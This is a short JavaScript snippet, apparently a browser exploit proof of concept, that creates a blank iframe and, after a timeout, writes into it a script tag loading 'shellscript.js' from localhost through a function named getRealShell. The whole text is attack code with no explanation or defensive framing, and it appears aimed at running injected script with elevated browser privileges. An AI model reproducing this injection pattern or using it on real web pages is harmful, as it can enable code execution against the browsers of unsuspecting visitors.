function getRealShell() {
    myiframe.document.write("<SCRIPT SRC='http://localhost/shellscript.js'><\/SCRIPT>");
}

document.write("<IFRAME ID=myiframe SRC='about:blank' WIDTH=200 HEIGHT=200></IFRAME>");
setTimeout("getRealShell()",100);
